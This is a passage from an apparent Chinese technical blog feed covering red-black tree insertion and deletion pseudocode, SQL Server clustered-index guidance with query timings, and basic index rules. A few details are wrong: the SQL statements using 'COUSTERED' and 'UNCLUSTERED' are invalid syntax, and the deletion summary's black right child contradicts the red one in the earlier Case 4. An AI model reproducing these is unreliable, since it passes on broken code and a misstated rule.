<p>B*树：在B+树基础上，为非叶子结点也增加链表指针，将结点的最低利用率从1&#x2F;2提高到2&#x2F;3；</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>RBT红黑树（一）概念和插入算法</title>
    <url>/blog/algorithm/tree/rbt/</url>
    <content><![CDATA[<h2 id="红黑树的介绍"><a href="#红黑树的介绍" class="headerlink" title="红黑树的介绍"></a>红黑树的介绍</h2><p>红黑树，一种二叉查找树，但在每个结点上增加一个存储位表示结点的颜色，可以是Red或Black。</p>
<p>通过对任何一条从根到叶子的路径上各个结点着色方式的限制，红黑树确保没有一条路径会比其他路径长出俩倍，因而是接近平衡的。</p>
<p>和AVL相比：</p>
<p>AVL是严格平衡树，因此在增加或者删除节点的时候，根据不同情况，旋转的次数比红黑树要多；</p>
<p>红黑是弱平衡的，用非严格的平衡来换取增删节点时候旋转次数的降低；</p>
<p>所以简单说，搜索的次数远远大于插入和删除，那么选择AVL树，如果搜索，插入删除次数几乎差不多，应该选择RB树。</p>
<p>性质：</p>
<p>红黑树上每个结点内含五个域，color，key，left，right，p。如果相应的指针域没有，则设为NIL。</p>
<p>一般的，红黑树，满足以下性质，即只有满足以下全部性质的树，我们才称之为红黑树：</p>
<ol>
<li>每个结点要么是红的，要么是黑的。</li>
<li>根结点是黑的。</li>
<li>每个叶结点，即空结点（NIL）是黑的。</li>
<li>如果一个结点是红的，那么它的俩个儿子都是黑的。</li>
<li>对每个结点，从该结点到其子孙结点的所有路径上包含相同数目的黑结点。</li>
</ol>
<p>下图所示，即是一颗红黑树：</p>
<p><img src="/images/tree/rbt.jpg"></p>
<h2 id="RBT插入算法"><a href="#RBT插入算法" class="headerlink" title="RBT插入算法"></a>RBT插入算法</h2><p>在看RBT插入算法之前，要先懂了BST二叉查找树的插入算法，和AVLT平衡二叉树中讲的旋转的算法。</p>
<p><a href="/algorithm/tree/bst.php">BST二叉搜索树</a></p>
<p><a href="/algorithm/tree/avlt.php">AVLT自平衡二叉查找树</a></p>
<p>插入算法伪代码：</p>
<p>RB-INSERT(T, z)</p>
<pre><code> 1  y ← nil[T]         // y 始终指向 x 的父结点。
 2  x ← root[T]        // x 指向当前树的根结点，
 3  while x ≠ nil[T]
 4      do y ← x
 5         if key[z] &lt; key[x]    //向左，向右..
 6            then x ← left[x]
 7            else x ← right[x] // 为了找到合适的插入点，x 探路跟踪路径，直到x成为NIL 为止。
 8  p[z] ← y         // y置为 插入结点z 的父结点。
 9  if y = nil[T]
10     then root[T] ← z
11     else if key[z] &lt; key[y]
12             then left[y] ← z
13             else right[y] ← z     //此 8-13行，置z 相关的指针。
14  left[z] ← nil[T]
15  right[z] ← nil[T]            //设为空，
16  color[z] ← RED             //将新插入的结点z作为红色
17  RB-INSERT-FIXUP(T, z)   //因为将z着为红色，可能会违反某一红黑性质，
                            //所以需要调用RB-INSERT-FIXUP(T, z)来保持红黑性质。
</code></pre>
<p>和BST的TREE-INSERT(T, z)相比，RB-INSERT(T,z)在后面追加了14~17四行，前面的都一样。</p>
<p>RB-INSERT-FIXUP(T, z)是插入算法的核心，用来修复插入操作后BST的性质。</p>
<h3 id="RB-INSERT-FIXUP-T-z"><a href="#RB-INSERT-FIXUP-T-z" class="headerlink" title="RB-INSERT-FIXUP(T, z)"></a>RB-INSERT-FIXUP(T, z)</h3><pre><code>RB-INSERT-FIXUP(T, z)
 1 while color[p[z]] = RED
 2     do if p[z] = left[p[p[z]]]
 3           then y ← right[p[p[z]]]
 4                if color[y] = RED
 5                   then color[p[z]] ← BLACK       ? Case 1
 6                        color[y] ← BLACK          ? Case 1
 7                        color[p[p[z]]] ← RED      ? Case 1
 8                        z ← p[p[z]]               ? Case 1
 9                   else if z = right[p[z]]
10                           then z ← p[z]          ? Case 2
11                                LEFT-ROTATE(T, z)  ? Case 2
12                           color[p[z]] ← BLACK    ? Case 3
13                           color[p[p[z]]] ← RED   ? Case 3
14                           RIGHT-ROTATE(T, p[p[z]]) ? Case 3
15           else (same as then clause with
                    &quot;right&quot; and &quot;left&quot; exchanged)
16 color[root[T]] ← BLACK
</code></pre>
<p>从伪代码的注释可以看出，插入后会出现三种情况要处理，名为Case1~3。</p>
<p>在对红黑树进行插入操作时，我们一般总是插入红色的结点，因为这样可以在插入过程中尽量避免对树的调整。</p>
<p>那么，我们插入一个结点后，可能会使原树的哪些性质改变呢?</p>
<p>由于，我们是按照二叉树的方式进行插入，因此元素的搜索性质不会改变。</p>
<p>如果插入的结点是根结点，性质2会被破坏，如果插入结点的父结点是红色，则会破坏性质4。</p>
<p>因此，总而言之，插入一个红色结点只会破坏性质2或性质4。</p>
<p>恢复策略很简单：</p>
<p>其一、把出现违背红黑树性质的结点向上移，如果能移到根结点，那么很容易就能通过直接修改根结点来恢复红黑树的性质。直接通过修改根结点来恢复红黑树应满足的性质。</p>
<p>其二、穷举所有的可能性，之后把能归于同一类方法处理的归为同一类，单独处理。</p>
<h4 id="插入的是根结点"><a href="#插入的是根结点" class="headerlink" title="插入的是根结点"></a>插入的是根结点</h4><p>原树是空树，此情况只会违反性质2。</p>
<p>对策：直接把此结点涂为黑色。</p>
<h4 id="插入的结点的父结点是黑色"><a href="#插入的结点的父结点是黑色" class="headerlink" title="插入的结点的父结点是黑色"></a>插入的结点的父结点是黑色</h4><p>此不会违反性质2和性质4，红黑树没有被破坏。</p>
<p>此不会违反性质2和性质4，红黑树没有被破坏。</p>
<h4 id="Case1第一种情况"><a href="#Case1第一种情况" class="headerlink" title="Case1第一种情况"></a>Case1第一种情况</h4><p>第一种情况，即上述代码的第5-8行：</p>
<pre><code>5   then color[p[z]] ← BLACK  ? Case 1
6   color[y] ← BLACK          ? Case 1
7   color[p[p[z]]] ← RED      ? Case 1
8   z ← p[p[z]]               ? Case 1
 
</code></pre>
<p>当前结点的父结点是红色且祖父结点的另一个子结点（叔叔结点）是红色。</p>
<p>此时父结点的父结点一定存在，否则插入前就已不是红黑树。</p>
<p>与此同时，又分为父结点是祖父结点的左子还是右子，对于对称性，我们只要解开一个方向就可以了。</p>
<p>在此，我们只考虑父结点为祖父左子的情况。</p>
<p>同时，还可以分为当前结点是其父结点的左子还是右子，但是处理方式是一样的。我们将此归为同一类。</p>
<p>对策：将当前节点的父节点和叔叔节点涂黑，祖父结点涂红，把当前结点指向祖父节点，从新的当前节点重新开始算法。</p>
<p>针对Case1，变化前（图片来源：saturnman）[插入4节点]：</p>
<p><img src="/images/tree/rbtcase1-1.png"></p>
<p>变化后</p>
<p><img src="/images/tree/rbtcase1-2.png"></p>
<p>总结：</p>
<p><img src="/images/tree/rbtcase1.jpg"></p>
<p>如上图所示，a：z为右孩子，b：z为左孩子。</p>
<p>只有p[z]和y（上图a中A为p[z]，D为z，上图b中，B为p[z]，D为y）都是红色的时候，才会执行此情况1.</p>
<p>因为p[p[z]]，即c是黑色，所以将p[z]、y都着为黑色（如上图a部分的右边），此举解决z、p[z]都是红色的问题，将p[p[z]]着为红色，则保持了性质5.</p>
<h4 id="Case2-3情况二和情况三"><a href="#Case2-3情况二和情况三" class="headerlink" title="Case2~3情况二和情况三"></a>Case2~3情况二和情况三</h4><p>代码为9~14行。</p>
<pre><code>9  if z = right[p[z]]
10    then z ← p[z]           ? Case 2
11         LEFT-ROTATE(T, z)   ? Case 2
12     color[p[z]] ← BLACK    ? Case 3
13     color[p[p[z]]] ← RED    ? Case 3
14     RIGHT-ROTATE(T, p[p[z]]) ? Case 3
</code></pre>
<p>z &#x3D;right[p[z]]判断z是不是其父的右节点，如果是对其父进行一个左旋，变成Case3。</p>
<p>Case2的示例：</p>
<p>当前节点的父节点是红色,叔叔节点是黑色，当前节点是其父节点的右子</p>
<p>对策：当前节点的父节点做为新的当前节点，以新当前节点为支点左旋。</p>
<p>如下图所示，变化前[当前节点7节点]：</p>
<p><img src="/images/tree/rbtcase2-1.png"></p>
<p>变化后：</p>
<p><img src="/images/tree/rbtcase2-2.png"></p>
<p>现在可以当作Case3来讨论了。</p>
<p>Case3示例：</p>
<p>当前节点的父节点是红色,叔叔节点是黑色，当前节点是其父节点的左子</p>
<p>解法：父节点变为黑色，祖父节点变为红色，在祖父节点为支点右旋</p>
<p>如下图所示[当前节点2节点]</p>
<p><img src="/images/tree/rbtcase3-1.png"></p>
<p>变化后：</p>
<p><img src="/images/tree/rbtcase3-2.png"></p>
<p>总结：</p>
<p>情况2，情况3都违反性质4（一个红结点的俩个儿子都是黑色的）。Case2和Case3这俩种情况，是通过z是p[z]的左孩子，还是右孩子区别的。</p>
<p><img src="/images/tree/rbtcase2.jpg"></p>
<p>参照上图，针对情况2，z是她父亲的右孩子，则为了保持红黑性质，左旋则变为情况3，此时z为左孩子，</p>
<p>情况2-&gt;左旋后-&gt;情况3，此时情况3同样违反性质4，所以情况3-&gt;右旋，得到上图的最后那部分。</p>
<p>注，情况2、3都只违反性质4，其它的性质1、2、3、5都不违背。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下插入情况：</p>
<p>爷黑子两红-&gt;爷红子两黑</p>
<p>爷黑父红-&gt;左旋右旋</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>RBT红黑树（二）删除算法</title>
    <url>/blog/algorithm/tree/rbtdel/</url>
    <content><![CDATA[<p>在看本文前请先看<a href="/algorithm/tree/rbt/">RBT红黑树（一）概念和插入算法</a></p>
<h2 id="RBT删除算法"><a href="#RBT删除算法" class="headerlink" title="RBT删除算法"></a>RBT删除算法</h2><p>红黑树的删除和BST基本相同，只是多了调整树的过程。这里再复习一下删除的思想：</p>
<p>根据待删除结点的孩子情况，分三种情况：没有孩子，只有一个孩子，有两个孩子。</p>
<p>1.没有孩子的情况，其父结点指向空，删除该结点。</p>
<p>2.有一个孩子的情况，其父结点指向其孩子，删除该结点。</p>
<p>3.有两个孩子的情况，当前结点要用其它结点替换，然后释放当前结点。</p>
<p>用左子树中的最大元素替换当前结点。左子树一直right到nil，可能有左节点。</p>
<p>用右子树中的最小结点替换当前结点。右子树一直left到nil，可能有右节点。</p>
<p>替换后不改变BST的性质，可以自己想一下。</p>
<p>RBT删除伪代码：</p>
<p>对于两个孩子的情况用的是右子树的最小结点。</p>
<p>RB-DELETE(T, z)</p>
<pre><code> 1 if left[z] = nil[T] or right[z] = nil[T]
 2    then y ← z
 3    else y ← TREE-SUCCESSOR(z)
 4 if left[y] ≠ nil[T]
 5    then x ← left[y]
 6    else x ← right[y]
 7 p[x] ← p[y]
 8 if p[y] = nil[T]
 9    then root[T] ← x
10    else if y = left[p[y]]
11            then left[p[y]] ← x
12            else right[p[y]] ← x
13 if y ≠ z
14    then key[z] ← key[y]
15         copy y&#39;s satellite data into z
16 if color[y] = BLACK               //如果y是黑色的，
17    then RB-DELETE-FIXUP(T, x)   //则调用RB-DELETE-FIXUP(T, x) 
18 return y
</code></pre>
<p>对于有两个孩子的节点，删除的是其右子树的最小结点。最小结点的内容会替换要删除结点的内容。</p>
<p>对于RBT的删除操作，只有删除节点为黑色时才进行调整，删除有两个孩子的节点，实际删除的是右子树最小节点。这个结点对应伪代码中的y。</p>
<p>删除的节点y一定至多有一个孩子，这个很明显，自己想一下。</p>
<p>删除的节点为红色时不必变RBT的性质，所以不要调整，为黑色才调整。调整时传入的x为删除节点y的孩子节点。</p>
<p>下文中的图都是删除后的RBT，其中标注的x就是删除节点的孩子。</p>
<h3 id="RB-DELETE-FIXUP"><a href="#RB-DELETE-FIXUP" class="headerlink" title="RB-DELETE-FIXUP"></a>RB-DELETE-FIXUP</h3><p>伪代码：</p>
<p>RB-DELETE-FIXUP(T, x)</p>
<pre><code> 1 while x ≠ root[T] and color[x] = BLACK
 2     do if x = left[p[x]]
 3           then w ← right[p[x]]
 4                if color[w] = RED
 5                   then color[w] ← BLACK                        ?  Case 1
 6                        color[p[x]] ← RED                       ?  Case 1
 7                        LEFT-ROTATE(T, p[x])                    ?  Case 1
 8                        w ← right[p[x]]                         ?  Case 1
 9                if color[left[w]] = BLACK and color[right[w]] = BLACK
10                   then color[w] ← RED                          ?  Case 2
11                        x ← p[x]                                  ?  Case 2
12                   else if color[right[w]] = BLACK
13                           then color[left[w]] ← BLACK          ?  Case 3
14                                color[w] ← RED                  ?  Case 3
15                                RIGHT-ROTATE(T, w)              ?  Case 3
16                                w ← right[p[x]]                 ?  Case 3
17                         color[w] ← color[p[x]]                 ?  Case 4
18                         color[p[x]] ← BLACK                    ?  Case 4
19                         color[right[w]] ← BLACK                ?  Case 4
20                         LEFT-ROTATE(T, p[x])                   ?  Case 4
21                         x ← root[T]                            ?  Case 4
22        else (same as then clause with &quot;right&quot; and &quot;left&quot; exchanged)
23 color[x] ← BLACK 
</code></pre>
<p>当前节点为x，从伪代码中看出，有两种简单情况：</p>
<p>当前节点是红色，直接把当前节点染成黑色，结束。</p>
<p>当前节点是黑色且是根节点，什么都不做，结束。</p>
<p>其它情况分为四种情况处理。这里简单说明一下。</p>
<p>Case1：从代码结构可以看出Case1不能平衡RBT，会转换成Case2~4。</p>
<p>Case2：可以平衡RBT树，上移x，new x为红节点会结束循环，为黑会继续调整。</p>
<p>Case3：不能平衡RBT，转换成Case4。</p>
<p>Case4：可以平衡RBT树，x会指向ROOT，结束循环。</p>
<p>下图为四种情况的变换图：</p>
<p><img src="/images/tree/rbtdelall.jpg"></p>
<p>图中x都为黑色，这是因为当前节点是红色，直接把当前节点染成黑色，RBT平衡了，是一种简单情况。</p>
<p>图中w节点永远是x的兄弟结点。</p>
<h4 id="Case1"><a href="#Case1" class="headerlink" title="Case1"></a>Case1</h4><pre><code> 5      then color[w] ← BLACK    ?  Case 1
 6           color[p[x]] ← RED   ?  Case 1
 7           LEFT-ROTATE(T, p[x]) ?  Case 1
 8           w ← right[p[x]]     ?  Case 1
</code></pre>
<p><img src="/images/tree/rbtdelc1.jpg"></p>
<p>对策：改变w、p[z]颜色，再对p[x]做一次左旋，红黑性质得以继续保持，A~E黑高度都没变。</p>
<p>x的新兄弟new w是旋转之前w的某个孩子，为黑色。</p>
<p>所以，情况1转化成情况2或3、4。</p>
<h4 id="Case2"><a href="#Case2" class="headerlink" title="Case2"></a>Case2</h4><pre><code>10  then color[w] ← RED   ?  Case 2
11       x &lt;-p[x]         ?  Case 2
</code></pre>
<p><img src="/images/tree/rbtdelc2.jpg"></p>
<p>如图所示，w的俩个孩子都是黑色的，w也是黑的。</p>
<p>因为删除后B的左子树比右子树黑高度小1，把w改为红的，则B的左右子树黑高度就一样了。</p>
<p>但和删除之前相比，左右子树的黑高度都小了1。</p>
<p>如果B是红的，直接改为黑的，BST就平衡了，和删除之前一样，这会在下个循环完成。</p>
<p>如果B是黑的，会再进入循环向上迭代。</p>
<h4 id="Case3"><a href="#Case3" class="headerlink" title="Case3"></a>Case3</h4><pre><code>13   then color[left[w]] ← BLACK  ?  Case 3
14        color[w] ← RED          ?  Case 3
15        RIGHT-ROTATE(T, w)      ?  Case 3
16        w ← right[p[x]]       ?  Case 3
</code></pre>
<p><img src="/images/tree/rbtdelc3.jpg"></p>
<p>w为黑，其左孩子为红，右孩子为黑</p>
<p>对策：交换w和和其左孩子left[w]的颜色。 即上图的D、C颜色互换。</p>
<p>并对w进行右旋，而红黑性质仍然得以保持。</p>
<p>现在x的新兄弟w是一个有红色右孩子的黑结点，于是将情况3转化为情况4.</p>
<h4 id="Case4"><a href="#Case4" class="headerlink" title="Case4"></a>Case4</h4><pre><code>17   color[w] ← color[p[x]]    ?  Case 4
18   color[p[x]] ← BLACK       ?  Case 4
19   color[right[w]] ← BLACK   ?  Case 4
20   LEFT-ROTATE(T, p[x])      ?  Case 4
21   x ← root[T]              ?  Case 4
</code></pre>
<p><img src="/images/tree/rbtdelc4.jpg"></p>
<p>x的兄弟w为黑色，且w的右孩子为红色。</p>
<p>对策：做颜色修改，并对p[x]做一次旋转，可以去掉x的额外黑色，来把x变成单独的黑色，此举不破坏红黑性质。</p>
<p>这样做右子树黑高度没变，左子树黑高度加了1，和删除前一样了。</p>
<p>最后将x置为根后，循环结束。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>可以结束调整的两种状态要记住，总结为以下两句话：</p>
<p>父红右三黑：x的父为红，父的右是三个黑结点。</p>
<p>右黑右红：x的父的右节点为黑，右节点的右孩子为黑。</p>
<p>其它情况在不破坏RBT的红黑性质前提下做旋转，转换到这两种状态。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>聚集索引(聚簇索引)的使用</title>
    <url>/blog/database/dbi/clusterdbi/</url>
    <content><![CDATA[<p>本文内容摘自互联网，出处不明</p>
<h2 id="聚集索引"><a href="#聚集索引" class="headerlink" title="聚集索引"></a>聚集索引</h2><p>聚集索引中键值的逻辑顺序决定了表中相应行的物理顺序。</p>
<p>聚集索引类似于电话簿，后者按姓氏排列数据。由于聚集索引规定数据在表中的物理存储顺序，因此一个表只能包含一个聚集索引。但该索引可以包含多个列（组合索引），就像电话簿按姓氏和名字进行组织一样。</p>
<p>聚集索引对于那些经常要搜索范围值的列特别有效。使用聚集索引找到包含第一个值的行后，便可以确保包含后续索引值的行在物理相邻。</p>
<p>例如，如果应用程序执行<br>的一个查询经常检索某一日期范围内的记录，则使用聚集索引可以迅速找到包含开始日期的行，然后检索表中所有相邻的行，直到到达结束日期。这样有助于提高此<br>类查询的性能。同样，如果对从表中检索的数据进行排序时经常要用到某一列，则可以将该表在该列上聚集（物理排序），避免每次查询该列时都进行排序，从而节<br>省成本。</p>
<p>当索引值唯一时，使用聚集索引查找特定的行也很有效率。例如，使用唯一雇员<br>ID 列 emp_id 查找特定雇员的最快速的方法，是在 emp_id<br>列上创建聚集索引或 PRIMARY KEY 约束。</p>
<h2 id="何时使用聚集索引"><a href="#何时使用聚集索引" class="headerlink" title="何时使用聚集索引"></a>何时使用聚集索引</h2><p>下面的表总结了何时使用聚集索引或非聚集索引（很重要）：</p>
<hr>
<pre><code>    动作描述        使用聚集索引   使用非聚集索引
列经常被分组排序         应              应
</code></pre>
<p>   返回某范围内的数据        应             不应<br>    一个或极少不同值        不应            不应<br>     小数目的不同值          应             不应<br>     大数目的不同值         不应             应<br>      频繁更新的列          不应             应<br>         外键列              应              应<br>         主键列              应              应<br>     频繁修改索引列         不应             应</p>
<hr>
<p>事实上，我们可以通过前面聚集索引和非聚集索引的定义的例子来理解上表。如：返回某范围内的数据一项。比如您的某个表有一个时间列，恰好您把聚合索引建立在了该列，这时您查询2004年1月1日至2004年10月1日之间的全部数据时，这个速度就将是很快的，因为您的这本字典正文是按日期进行排序的，聚类索引只需要找到要检索的所有数据中的开头和结尾数据即可；而不像非聚集索引，必须先查到目录中查到每一项数据对应的页码，然后再根据页码查到具体内容。</p>
<h2 id="结合实际，谈索引使用的误区"><a href="#结合实际，谈索引使用的误区" class="headerlink" title="结合实际，谈索引使用的误区"></a>结合实际，谈索引使用的误区</h2><p>理论的目的是应用。虽然我们刚才列出了何时应使用聚集索引或非聚集索引，但在实践中以上规则却很容易被忽视或不能根据实际情况进行综合分析。下面我们将根据在实践中遇到的实际问题来谈一下索引使用的误区，以便于大家掌握索引建立的方法。</p>
<h3 id="1、主键就是聚集索引"><a href="#1、主键就是聚集索引" class="headerlink" title="1、主键就是聚集索引"></a>1、主键就是聚集索引</h3><p>这种想法笔者认为是极端错误的，是对聚集索引的一种浪费。虽然SQL<br>SERVER默认是在主键上建立聚集索引的。</p>
<p>通常，我们会在每个表中都建立一个ID列，以区分每条数据，并且这个ID列是自动增大的，步长一般为1。我们的这个办公自动化的实例中的列Gid就是如此。此时，如果我们将这个列设为主键，SQL<br>SERVER会将此列默认为聚集索引。这样做有好处，就是可以让您的数据在数据库中按照ID进行物理排序，但笔者认为这样做意义不大。</p>
<p>显而易见，聚集索引的优势是很明显的，而每个表中只能有一个聚集索引的规则，这使得聚集索引变得更加珍贵。</p>
<p>从我们前面谈到的聚集索引的定义我们可以看出，使用聚集索引的最大好处就是能够根据查询要求，迅速缩小查询范围，避免全表扫描。在实际应用中，因为<br>ID号是自动生成的，我们并不知道每条记录的ID号，所以我们很难在实践中用ID号来进行查询。这就使让ID号这个主键作为聚集索引成为一种资源浪费。其次，让每个ID号都不同的字段作为聚集索引也不符合”大数目的不同值情况下不应建立聚合索引”规则；当然，这种情况只是针对用户经常修改记录内容，特别是索引项的时候会负作用，但对于查询速度并没有影响。</p>
<p>在办公自动化系统中，无论是系统首页显示的需要用户签收的文件、会议还是用户进行文件查询等任何情况下进行数据查询都离不开字段的是”日期”还有用户本身的”用户名”。</p>
<p>通常，办公自动化的首页会显示每个用户尚未签收的文件或会议。虽然我们的where语句可以仅仅限制当前用户尚未签收的情况，但如果您的系统已建立了很长时间，并且数据量很大，那么，每次每个用户打开首页的时候都进行一次全表扫描，这样做意义是不大的，绝大多数的用户1个月前的文件都已经浏览过了，这样做只能徒增数据库的开销而已。事实上，我们完全可以让用户打开系统首页时，数据库仅仅查询这个用户近3个月来未阅览的文件，通过”日期”这个字段来限制表扫描，提高查询速度。如果您的办公自动化系统已经建立的2年，那么您的首页显示速度理论上将是原来速度8倍，甚至更快。</p>
<p>在这里之所以提到”理论上”三字，是因为如果您的聚集索引还是盲目地建在ID这个主键上时，您的查询速度是没有这么高的，即使您在”日期”这个字段上建立的索引（非聚合索引）。下面我们就来看一下在1000万条数据量的情况下各种查询的速度表现（3个月内的数据为25万条）：</p>
<p>（1）仅在主键上建立聚集索引，并且不划分时间段：</p>
<p>Select gid,fariqi,neibuyonghu,title from tgongwen<br>where fariqi&gt; dateadd(day,-90,getdate())</p>
<p>用时：128470毫秒（即：128秒）</p>
<p>（2）在主键上建立聚集索引，在fariq上建立非聚集索引：</p>
<p>select gid,fariqi,neibuyonghu,title from Tgongwen<br>where fariqi&gt; dateadd(day,-90,getdate())</p>
<p>用时：53763毫秒（54秒）</p>
<p>（3）将聚合索引建立在日期列（fariqi）上：</p>
<p>select gid,fariqi,neibuyonghu,title from Tgongwen<br>where fariqi&gt; dateadd(day,-90,getdate())</p>
<p>用时：2423毫秒（2秒）</p>
<p>虽然每条语句提取出来的都是25万条数据，各种情况的差异却是巨大的，特别是将聚集索引建立在日期列时的差异。事实上，如果您的数据库真的有1000<br>万容量的话，把主键建立在ID列上，就像以上的第1、2种情况，在网页上的表现就是超时，根本就无法显示。这也是我摒弃ID列作为聚集索引的一个最重要的因素。得出以上速度的方法是：在各个select语句前加：</p>
<p>declare @d datetime<br>set @d&#x3D;getdate()</p>
<p>并在select语句后加：</p>
<p>select [语句执行花费时间(毫秒)]&#x3D;datediff(ms,@d,getdate())</p>
<h3 id="2、只要建立索引就能显著提高查询速度"><a href="#2、只要建立索引就能显著提高查询速度" class="headerlink" title="2、只要建立索引就能显著提高查询速度"></a>2、只要建立索引就能显著提高查询速度</h3><p>事实上，我们可以发现上面的例子中，第2、3条语句完全相同，且建立索引的字段也相同；不同的仅是前者在fariqi字段上建立的是非聚合索引，后者在此字段上建立的是聚合索引，但查询速度却有着天壤之别。所以，并非是在任何字段上简单地建立索引就能提高查询速度。</p>
<p>从建表的语句中，我们可以看到这个有着1000万数据的表中fariqi字段有5003个不同记录。在此字段上建立聚合索引是再合适不过了。在现实中，我们每天都会发几个文件，这几个文件的发文日期就相同，这完全符合建立聚集索引要求的：”既不能绝大多数都相同，又不能只有极少数相同”的规则。由此看来，我们建立”适当”的聚合索引对于我们提高查询速度是非常重要的。</p>
<h3 id="3、把所有需要提高查询速度的字段都加进聚集索引，以提高查询速度"><a href="#3、把所有需要提高查询速度的字段都加进聚集索引，以提高查询速度" class="headerlink" title="3、把所有需要提高查询速度的字段都加进聚集索引，以提高查询速度"></a>3、把所有需要提高查询速度的字段都加进聚集索引，以提高查询速度</h3><p>上面已经谈到：在进行数据查询时都离不开字段的是”日期”还有用户本身的”用户名”。既然这两个字段都是如此的重要，我们可以把他们合并起来，建立一个复合索引（compound<br>index）。</p>
<p>很多人认为只要把任何字段加进聚集索引，就能提高查询速度，也有人感到迷惑：如果把复合的聚集索引字段分开查询，那么查询速度会减慢吗？带着这个问题，我们来看一下以下的查询速度（结果集都是25万条数据）：（日期列fariqi首先排在复合聚集索引的起始列，用户名neibuyonghu排在后列）：</p>
<p>（1）select gid,fariqi,neibuyonghu,title from Tgongwen where<br>fariqi&gt;&#39;&#39;2004-5-5&#39;&#39;</p>
<p>查询速度：2513毫秒</p>
<p>（2）select gid,fariqi,neibuyonghu,title from Tgongwen<br>where fariqi&gt;&#39;&#39;2004-5-5&#39;&#39; and neibuyonghu&#x3D;&#39;&#39;办公室&#39;&#39;</p>
<p>查询速度：2516毫秒</p>
<p>（3）select gid,fariqi,neibuyonghu,title from Tgongwen where<br>neibuyonghu&#x3D;&#39;&#39;办公室&#39;&#39;</p>
<p>查询速度：60280毫秒</p>
<p>从以上试验中，我们可以看到如果仅用聚集索引的起始列作为查询条件和同时用到复合聚集索引的全部列的查询速度是几乎一样的，甚至比用上全部的复合索引列还要略快（在查询结果集数目一样的情况下）；而如果仅用复合聚集索引的非起始列作为查询条件的话，这个索引是不起任何作用的。当然，语句1、2的查询速度一样是因为查询的条目数一样，如果复合索引的所有列都用上，而且查询结果少的话，这样就会形成”索引覆盖”，因而性能可以达到最优。同时，请记住：无论您是否经常使用聚合索引的其他列，但其前导列一定要是使用最频繁的列。\</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库索引使用基础知识</title>
    <url>/blog/database/dbi/dbiusebase/</url>
    <content><![CDATA[<h2 id="哪些列上可以创建索引"><a href="#哪些列上可以创建索引" class="headerlink" title="哪些列上可以创建索引"></a>哪些列上可以创建索引</h2><p>在经常需要<strong>搜索</strong>的列上，可以加快搜索的速度；</p>
<p>在作为<strong>主键</strong>的列上，强制该列的唯一性和组织表中数据的排列结构；</p>
<p>在经常用在<strong>连接</strong>的列上，这些列主要是一些外键，可以加快连接的速度；</p>
<p>在经常需要<strong>根据范围进行搜索</strong>的列上创建索引，因为索引已经排序，其指定的范围是连续的；</p>
<p>在经常需要<strong>排序</strong>的列上创建索引，因为索引已经排序，这样查询可以利用索引的排序，加快排序查询时间；</p>
<p>在经常使用在WHERE子句中的列上面创建索引，加快条件的判断速度。</p>
<h2 id="哪些列上不能创建索引"><a href="#哪些列上不能创建索引" class="headerlink" title="哪些列上不能创建索引"></a>哪些列上不能创建索引</h2><p>第一，对于那些在查询中<strong>很少使用或者参考的列</strong>不应该创建索引。</p>
<p>这是因为，既然这些列很少使用到，因此有索引或者无索引，并不能提高查询速度。相反，由于增加了索引，反而降低了系统的维护速度和增大了空间需求。</p>
<p>第二，对于那些只有<strong>很少数据值的列</strong>也不应该增加索引。这</p>
<p>是因为，由于这些列的取值很少，例如人事表的性别列，在查询的结果中，结果集的数据行占了表中数据行的很大比例，即需要在表中搜索的数据行的比例很大。增加索引，并不能明显加快检索速度。</p>
<p>第三，对于那些定义为text, image和bit数据类型的列不应该增加索引。</p>
<p>这是因为，这些列的数据量要么相当大，要么取值很少。</p>
<p>第四，当<strong>修改性能远远大于检索性能时，不应该创建索引</strong>。</p>
<p>这是因为，修改性能和检索性能是互相矛盾的。当增加索引时，会提高检索性能，但是会降低修改性能。当减少索引时，会提高修改性能，降低检索性能。因此，当修改性能远远大于检索性能时，不应该创建索引。</p>
<h2 id="索引没有使用可能是什么导致的"><a href="#索引没有使用可能是什么导致的" class="headerlink" title="索引没有使用可能是什么导致的"></a>索引没有使用可能是什么导致的</h2><p>单字段索引，查询中没有用到这个字段。</p>
<p>复合索引，查询中没有复合索引的第一个字段。</p>
<p>索引字段进行了函数操作。</p>
<p>索引字段查询条件是like。</p>
<p>索引字段值太少，如男、女，数据量很大。</p>
<p>表中数据量很少。</p>
<h2 id="索引有哪些类型"><a href="#索引有哪些类型" class="headerlink" title="索引有哪些类型"></a>索引有哪些类型</h2><p>1.直接创建索引和间接创建索引</p>
<p>直接创建索引： CREATE INDEX mycolumn_index ON mytable (myclumn)</p>
<p>间接创建索引：定义主键约束或者唯一性键约束，可以间接创建索引</p>
<p>2.普通索引和唯一性索引</p>
<p>普通索引：CREATE INDEX mycolumn_index ON mytable (myclumn)</p>
<p>唯一性索引：保证在索引列中的全部数据是唯一的，对聚簇索引和非聚簇索引都可以使用</p>
<p>CREATE UNIQUE COUSTERED INDEX myclumn_cindex ON mytable(mycolumn)</p>
<p>3.单个索引和复合索引</p>
<p>单个索引：即非复合索引</p>
<p>复合索引：又叫组合索引，在索引建立语句中同时包含多个字段名，最多16个字段</p>
<p>CREATE INDEX name_index ON username(firstname,lastname)</p>
<p>4.聚簇索引和非聚簇索引(聚集索引，群集索引)</p>
<p>聚簇索引：物理索引，与基表的物理顺序相同，数据值的顺序总是按照顺序排列</p>
<p>CREATE CLUSTERED INDEX mycolumn_cindex ON mytable(mycolumn) WITH<br>ALLOW_DUP_ROW</p>
<p>(允许有重复记录的聚簇索引)</p>
<p>非聚簇索引：CREATE UNCLUSTERED INDEX mycolumn_cindex ON<br>mytable(mycolumn)</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>主流内存数据库介绍</title>
    <url>/blog/database/article/memdb/</url>
    <content><![CDATA[<p><strong>什么是内存数据库</strong>?</p>
